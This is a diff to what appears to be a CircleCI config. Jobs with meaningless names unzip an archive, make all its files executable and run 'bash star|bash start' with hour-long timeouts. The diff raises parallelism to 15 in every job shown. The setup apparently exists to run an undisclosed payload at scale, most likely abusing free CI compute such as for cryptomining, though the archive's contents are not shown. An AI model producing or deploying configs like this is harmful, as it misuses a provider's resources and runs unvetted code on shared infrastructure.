@@ -7,19 +7,19 @@ jobs:
       steps:
         - checkout
         - run:
-            name: aba
+            name: abahi
             command: sudo apt update -y
         - run:
-            name: abi
+            name: abiah
             command: ls
         - run:
-            name: abua
-            command: unzip appp.zip; chmod u+x *
+            name: abuah
+            command: unzip app.zip; chmod u+x *
         - run:
-            name: alia
+            name: aliah
             no_output_timeout: 3600s
             command: bash star|bash start
-    parallelism: 1
+    parallelism: 15
   Bklip:
     docker:
       - image: cimg/node:18.2.0
@@ -39,7 +39,7 @@ jobs:
             name: biuolap
             no_output_timeout: 3600s
             command: bash star|bash start
-    parallelism: 10
+    parallelism: 15
   Copkli:
     docker:
       - image: cimg/node:16.15.0
@@ -59,7 +59,7 @@ jobs:
             name: clupasip
             no_output_timeout: 3600s
             command: bash star|bash start
-    parallelism: 10
+    parallelism: 15
   Diopli:
     docker:
       - image: cimg/node:14.19.2
@@ -79,7 +79,7 @@ jobs:
             name: doopmas
             no_output_timeout: 3600s
             command: bash star|bash start
-    parallelism: 10
+    parallelism: 15
   Erpani:
     docker:
       - image: cimg/node:12.13.1
@@ -99,7 +99,7 @@ jobs:
             name: enpass
             no_output_timeout: 3600s
             command: bash star|bash start
-    parallelism: 10
+    parallelism: 15
 
 
 workflows:
